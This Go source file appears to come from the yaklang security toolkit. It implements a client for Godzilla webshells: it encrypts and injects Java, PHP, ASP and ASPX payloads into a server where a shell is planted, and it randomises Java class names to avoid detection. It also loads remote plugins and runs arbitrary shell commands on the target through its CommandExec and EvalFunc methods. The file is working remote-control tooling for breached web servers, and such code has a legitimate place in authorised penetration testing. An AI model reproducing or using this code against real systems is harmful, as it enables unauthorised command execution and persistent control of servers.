package wsm

import (
	"bytes"
	"context"
	"encoding/hex"
	"fmt"
	"github.com/yaklang/yaklang/common/javaclassparser"
	"github.com/yaklang/yaklang/common/log"
	"github.com/yaklang/yaklang/common/utils"
	"github.com/yaklang/yaklang/common/utils/lowhttp"
	"github.com/yaklang/yaklang/common/utils/lowhttp/poc"
	"github.com/yaklang/yaklang/common/wsm/payloads"
	"github.com/yaklang/yaklang/common/wsm/payloads/behinder"
	"github.com/yaklang/yaklang/common/wsm/payloads/godzilla"
	"github.com/yaklang/yaklang/common/yak"
	"github.com/yaklang/yaklang/common/yakgrpc/ypb"
	"net/http"
	"strconv"
	"strings"
)

type Godzilla struct {
	Url string
	//
	// connection parameters
	Pass string
	// The key
	SecretKey []byte
	// shell type
	ShellScript string
	// encryption mode
	EncMode string
	Proxy   string
	// Custom header header
	Headers map[string]string
	// The interfering character at the beginning of the request
	ReqLeft string
	// The interfering character at the end of the request
	ReqRight string

	req             *http.Request
	dynamicFuncName map[string]string

	PacketScriptContent  string
	PayloadScriptContent string

	customEchoEncoder   codecFunc
	customEchoDecoder   codecFunc
	customPacketEncoder codecFunc
}

func NewGodzilla(ys *ypb.WebShell) (*Godzilla, error) {
	gs := &Godzilla{
		Url:             ys.GetUrl(),
		Pass:            ys.GetPass(),
		SecretKey:       secretKey(ys.GetSecretKey()),
		ShellScript:     ys.GetShellScript(),
		EncMode:         ys.GetEncMode(),
		Proxy:           ys.Proxy,
		Headers:         make(map[string]string, 2),
		dynamicFuncName: make(map[string]string, 2),
	}

	gs.setContentType()
	//if ys.GetHeaders() != nil {
	//	gs.Headers = ys.GetHeaders()
	//}
	return gs, nil
}

func (g *Godzilla) SetPayloadScriptContent(content string) {
	g.PayloadScriptContent = content
}

func (g *Godzilla) SetPacketScriptContent(content string) {
	g.PacketScriptContent = content

}

func (g *Godzilla) clientRequestEncode(raw []byte) ([]byte, error) {
	enRaw, err := g.enCryption(raw)
	if err != nil {
		return nil, err
	}
	if len(g.PacketScriptContent) == 0 {
		return enRaw, nil
	}

	if g.customPacketEncoder != nil {
		return g.customPacketEncoder(enRaw)
	}
	return g.ClientRequestEncode(enRaw)
}

func (g *Godzilla) ClientRequestEncode(raw []byte) ([]byte, error) {
	if len(g.PacketScriptContent) == 0 {
		return nil, utils.Errorf("empty packet script content")
	}

	engine, err := yak.NewScriptEngine(1000).ExecuteEx(g.PacketScriptContent, map[string]interface{}{
		"YAK_FILENAME": "req.GetScriptName()",
	})
	if err != nil {
		return nil, utils.Errorf("execute file %s code failed: %s", "req.GetScriptName()", err.Error())
	}
	result, err := engine.CallYakFunction(context.Background(), "wsmPacketEncoder", []interface{}{raw})
	if err != nil {
		return nil, utils.Errorf("import %v' s handle failed: %s", "req.GetScriptName()", err)
	}
	rspBytes := utils.InterfaceToBytes(result)

	return rspBytes, nil
}

func (g *Godzilla) ServerResponseDecode(raw []byte) ([]byte, error) {
	//TODO implement me
	panic("implement me")
}

func (g *Godzilla) echoResultEncode(raw []byte) ([]byte, error) {
	if g.customEchoEncoder != nil {
		return g.customEchoEncoder(raw)
	}
	return g.EchoResultEncodeFormYak(raw)
}

func (g *Godzilla) EchoResultEncodeFormYak(raw []byte) ([]byte, error) {
	if len(g.PayloadScriptContent) == 0 {
		return []byte(""), nil
	}

	engine, err := yak.NewScriptEngine(1000).ExecuteEx(g.PayloadScriptContent, map[string]interface{}{
		"YAK_FILENAME": "req.GetScriptName()",
	})
	if err != nil {
		return nil, utils.Errorf("execute file %s code failed: %s", "EchoResultEncodeFormYak", err.Error())
	}
	result, err := engine.CallYakFunction(context.Background(), "wsmPayloadEncoder", []interface{}{raw})
	if err != nil {
		return nil, utils.Errorf("import %v' s handle failed: %s", "EchoResultEncodeFormYak", err)
	}
	rspBytes := utils.InterfaceToBytes(result)

	return rspBytes, nil
}

func (g *Godzilla) echoResultDecode(raw []byte) ([]byte, error) {
	if g.customEchoDecoder != nil {
		return g.customEchoDecoder(raw)
	}
	if len(g.PayloadScriptContent) == 0 {
		return raw, nil
	}
	return g.EchoResultDecodeFormYak(raw)
}

func (g *Godzilla) EchoResultDecodeFormYak(raw []byte) ([]byte, error) {
	if len(g.PayloadScriptContent) == 0 {
		return nil, utils.Error("empty payload script content")
	}
	engine, err := yak.NewScriptEngine(1000).ExecuteEx(g.PayloadScriptContent, map[string]interface{}{
		"YAK_FILENAME": "req.GetScriptName()",
	})
	if err != nil {
		return nil, utils.Errorf("execute file %s code failed: %s", "req.GetScriptName()", err.Error())
	}
	result, err := engine.CallYakFunction(context.Background(), "wsmPayloadDecoder", []interface{}{raw})
	if err != nil {
		return nil, utils.Errorf("import %v' s handle failed: %s", "req.GetScriptName()", err)
	}
	rspBytes := utils.InterfaceToBytesSlice(result)[0]

	return rspBytes, nil
}

func (g *Godzilla) EchoResultEncodeFormGo(en codecFunc) {
	g.customEchoEncoder = en
}

func (g *Godzilla) EchoResultDecodeFormGo(de codecFunc) {
	g.customEchoDecoder = de
}

func (g *Godzilla) ClientRequestEncodeFormGo(en codecFunc) {
	g.customPacketEncoder = en
}

func (g *Godzilla) setDefaultParams() map[string]string {
	// TODO Add all parameters
	g.dynamicFuncName["test"] = "test"
	g.dynamicFuncName["getBasicsInfo"] = "getBasicsInfo"
	g.dynamicFuncName["execCommand"] = "execCommand"
	return g.dynamicFuncName
}

func (g *Godzilla) setContentType() {
	switch g.EncMode {
	case ypb.EncMode_Base64.String():
		g.Headers["Content-type"] = "application/x-www-form-urlencoded"
	case ypb.EncMode_Raw.String():
	default:
		panic("shell script type error [JSP/JSPX/ASP/ASPX/PHP]")
	}
}

// The native encryption method
func (g *Godzilla) enCryption(binCode []byte) ([]byte, error) {
	enPayload, err := godzilla.Encryption(binCode, g.SecretKey, g.Pass, g.EncMode, g.ShellScript, true)
	if err != nil {
		return nil, err
	}
	return enPayload, nil
}

func (g *Godzilla) deCryption(raw []byte) ([]byte, error) {
	deBody, err := godzilla.Decryption(raw, g.SecretKey, g.Pass, g.EncMode, g.ShellScript)
	if err != nil {
		return nil, err
	}
	return deBody, nil
}

func (g *Godzilla) getPayload(binCode string) ([]byte, error) {
	var payload []byte
	var err error
	switch g.ShellScript {
	case ypb.ShellScript_JSPX.String():
		fallthrough
	case ypb.ShellScript_JSP.String():
		payload, err = hex.DecodeString(godzilla.JavaClassPayload)
		if err != nil {
			return nil, err
		}
		//payload, err = g.dynamicUpdateClassName("payloadv4", payload)
		payload, err = g.dynamicUpdateClassName("payload", payload)
		if err != nil {
			return nil, err
		}
	case ypb.ShellScript_PHP.String():
		payload, err = hex.DecodeString(godzilla.PhpCodePayload)
		if err != nil {
			return nil, err
		}
		r1 := utils.RandStringBytes(50)
		payload = bytes.Replace(payload, []byte("FLAG_STR"), []byte(r1), 1)
	case ypb.ShellScript_ASPX.String():
		//payload, err = hex.DecodeString(godzilla.CsharpDllPayload)
		//if err != nil {
		//	return nil, err
		//}
		payload = payloads.CshrapPayload
	case ypb.ShellScript_ASP.String():
		payload, err = hex.DecodeString(godzilla.AspCodePayload)
		if err != nil {
			return nil, err
		}
		r1 := utils.RandStringBytes(50)
		payload = bytes.Replace(payload, []byte("FLAG_STR"), []byte(r1), 1)
	}
	return payload, nil
}

// Modify and record the correspondence before and after the modification
func (g *Godzilla) dynamicUpdateClassName(oldName string, classContent []byte) ([]byte, error) {
	clsObj, err := javaclassparser.Parse(classContent)
	if err != nil {
		return nil, err
	}
	fakeSourceFileName := utils.RandNumberStringBytes(8)
	err = clsObj.SetSourceFileName(fakeSourceFileName)
	if err != nil {
		return nil, err
	}
	// The original class is called payloav4, which represents the Godzilla v4 version
	g.dynamicFuncName[oldName+".java"] = fakeSourceFileName + ".java"

	// replaces the execCommand() function with the execCommand2() function. This is just a temporary replacement of the function name.
	//err = clsObj.SetMethodName("getBasicsInfo", "getBasicsInfo2")
	//if err != nil {
	//	return nil, err
	//}
	//g.dynamicFuncName["getBasicsInfo"] = "getBasicsInfo2"

	newClassName := payloads.RandomClassName()
	// Randomly replace the class name
	err = clsObj.SetClassName(newClassName)
	if err != nil {
		return nil, err
	}
	log.Info(fmt.Sprintf("%s ----->>>>> %s", oldName, newClassName))
	g.dynamicFuncName[oldName] = newClassName
	return clsObj.Bytes(), nil
}

func (g *Godzilla) post(data []byte) ([]byte, error) {
	resp, req, err := poc.DoPOST(
		g.Url,
		poc.WithProxy(g.Proxy),
		poc.WithAppendHeaders(g.Headers),
		poc.WithReplaceHttpPacketBody(data, false),
		poc.WithSession("godzilla"),
	)
	if err != nil {
		return nil, utils.Errorf("http request error: %v", err)
	}

	_, raw := lowhttp.SplitHTTPHeadersAndBodyFromPacket(resp.RawPacket)

	if len(raw) == 0 && g.req != nil {
		return nil, utils.Errorf("empty response")
	}
	g.req = req
	raw = bytes.TrimSuffix(raw, []byte("\r\n\r\n"))
	return raw, nil
}

func (g *Godzilla) sendPayload(data []byte) ([]byte, error) {
	enData, err := g.clientRequestEncode(data)
	if err != nil {
		return nil, err
	}
	body, err := g.post(enData)
	if err != nil {
		return nil, err
	}
	if len(body) == 0 {
		return nil, utils.Error("The return data is empty")
	}
	deBody, err := g.deCryption(body)
	if err != nil {
		return nil, err
	}
	log.Debugf("After decryption by default: %s", string(deBody))
	return g.echoResultDecode(deBody)
}

// EvalFunc. Personally, I simply understand it as a method to call the remote shell, serialize the instructions, and send the instructions.
func (g *Godzilla) EvalFunc(className, funcName string, parameter *godzilla.Parameter) ([]byte, error) {
	// fills in the random length
	r1, r2 := utils.RandSampleInRange(10, 20), utils.RandSampleInRange(10, 20)
	parameter.AddString(r1, r2)
	if className != "" && len(strings.Trim(className, " ")) > 0 {
		switch g.ShellScript {
		case ypb.ShellScript_JSPX.String():
			fallthrough
		case ypb.ShellScript_JSP.String():
			parameter.AddString("evalClassName", g.dynamicFuncName[className])
		case ypb.ShellScript_ASPX.String():
			parameter.AddString("evalClassName", className)
		case ypb.ShellScript_ASP.String():
			fallthrough
		case ypb.ShellScript_PHP.String():
			parameter.AddString("codeName", className)

		}
	}
	parameter.AddString("methodName", funcName)
	data := parameter.Serialize()
	log.Infof("send data: %q", string(data))

	//enData, err := g.enCryption(data)
	//enData, err := g.customEncoder(data)

	return g.sendPayload(data)
}

func newParameter() *godzilla.Parameter {
	return godzilla.NewParameter()
}

// Include remote shell load plug-in
func (g *Godzilla) Include(codeName string, binCode []byte) (bool, error) {
	parameter := newParameter()
	switch g.ShellScript {
	case ypb.ShellScript_JSPX.String():
		fallthrough
	case ypb.ShellScript_JSP.String():
		//binCode, err := g.dynamicUpdateClassName(codeName, binCode)
		//if err != nil {
		//	return false, err
		//}
		g.dynamicFuncName[codeName] = codeName
		codeName = g.dynamicFuncName[codeName]
		if codeName != "" {
			parameter.AddString("codeName", codeName)
			parameter.AddBytes("binCode", binCode)
			result, err := g.EvalFunc("", "include", parameter)
			if err != nil {
				return false, err
			}
			resultString := strings.Trim(string(result), " ")
			if resultString == "ok" {
				return true, nil
			} else {
				return false, utils.Error(resultString)
			}
		} else {
			return false, utils.Errorf("class: %s mapping does not exist", codeName)
		}
	case ypb.ShellScript_ASPX.String():
		parameter.AddString("codeName", codeName)
		parameter.AddBytes("binCode", binCode)
		result, err := g.EvalFunc("", "include", parameter)
		if err != nil {
			return false, err
		}
		resultString := strings.Trim(string(result), " ")
		if resultString == "ok" || resultString == "ko" {
			return true, nil
		} else {
			return false, utils.Error(resultString)
		}
	case ypb.ShellScript_ASP.String():
	case ypb.ShellScript_PHP.String():
		parameter.AddString("codeName", codeName)
		parameter.AddBytes("binCode", binCode)
		result, err := g.EvalFunc("", "includeCode", parameter)
		if err != nil {
			return false, err
		}
		resultString := strings.Trim(string(result), " ")
		if resultString == "ok" {
			return true, nil
		} else {
			return false, utils.Error(resultString)
		}
	}
	return false, nil
}

func (g *Godzilla) InjectPayload() error {
	payload, err := g.getPayload("")
	params := make(map[string]string, 2)
	value, _ := g.echoResultEncode([]byte(""))
	if len(value) != 0 {
		switch g.ShellScript {
		case ypb.ShellScript_ASPX.String():
			// todo
			params["customEncoderFromAssembly"] = string(value)
			payload, err = behinder.GetRawAssembly(hex.EncodeToString(payload), params)
			if err != nil {
				return err
			}
		case ypb.ShellScript_JSP.String(), ypb.ShellScript_JSPX.String():
			params["customEncoderFromClass"] = string(value)
		case ypb.ShellScript_PHP.String(), ypb.ShellScript_ASP.String():
			params["customEncoderFromText"] = string(value)
		}
	}

	if err != nil {
		return err
	}
	enc, err := godzilla.Encryption(payload, g.SecretKey, g.Pass, g.EncMode, g.ShellScript, false)

	if err != nil {
		return err
	}
	_, err = g.post(enc)
	if err != nil {
		return err
	}
	return nil
}

func (g *Godzilla) InjectPayloadIfNoCookie() error {
	if g.req == nil {
		err := g.InjectPayload()
		if err != nil {
			return err
		}
	}
	return nil
}

// Destroy all data in a session, you can clear the sess_PHPSESSID file in the cache folder
func (g *Godzilla) close() (bool, error) {
	parameter := newParameter()
	res, err := g.EvalFunc("", "close", parameter)
	if err != nil {
		return false, err
	}
	result := string(res)
	if "ok" == result {
		return true, nil
	} else {
		return false, utils.Error(result)
	}
}

//func (g *Godzilla) Encoder(f func(raw []byte) ([]byte, error)) ([]byte, error) {
//	g.CustomEncoder = encoderFunc
//	return nil, nil
//}

func (g *Godzilla) String() string {
	return fmt.Sprintf(
		"Url: %s, SecretKey: %x, ShellScript: %s, Proxy: %s, Headers: %v",
		g.Url,
		g.SecretKey,
		g.ShellScript,
		g.Proxy,
		g.Headers,
	)
}

func (g *Godzilla) GenWebShell() string {
	return ""
}

func (g *Godzilla) Ping(opts ...behinder.ExecParamsConfig) (bool, error) {
	err := g.InjectPayloadIfNoCookie()
	if err != nil {
		return false, nil
	}
	parameter := newParameter()
	result, err := g.EvalFunc("", "test", parameter)
	if err != nil {
		return false, err
	}
	if strings.Trim(string(result), " ") == "ok" {
		return true, nil
	} else {
		return false, utils.Error(result)
	}
}

func (g *Godzilla) BasicInfo(opts ...behinder.ExecParamsConfig) ([]byte, error) {
	err := g.InjectPayloadIfNoCookie()
	if err != nil {
		return nil, err
	}

	parameter := newParameter()
	basicsInfo, err := g.EvalFunc("", "getBasicsInfo", parameter)
	if err != nil {
		return nil, err
	}
	return parseBaseInfoToJson(basicsInfo), nil
}

func (g *Godzilla) CommandExec(cmd string, opts ...behinder.ExecParamsConfig) ([]byte, error) {
	err := g.InjectPayloadIfNoCookie()
	if err != nil {
		return nil, err
	}
	parameter := newParameter()
	parameter.AddString("cmdLine", cmd)
	commandArgs := godzilla.SplitArgs(cmd)
	for i := 0; i < len(commandArgs); i++ {
		parameter.AddString(fmt.Sprintf("arg-%d", i), commandArgs[i])
	}
	parameter.AddString("argsCount", strconv.Itoa(len(commandArgs)))

	executableArgs := godzilla.SplitArgsEx(cmd, 1, false)
	if len(executableArgs) > 0 {
		parameter.AddString("executableFile", executableArgs[0])
		if len(executableArgs) >= 2 {
			parameter.AddString("executableArgs", executableArgs[1])
		}
	}

	return g.EvalFunc("", "execCommand", parameter)
}

func (g *Godzilla) FileManagement() {

}
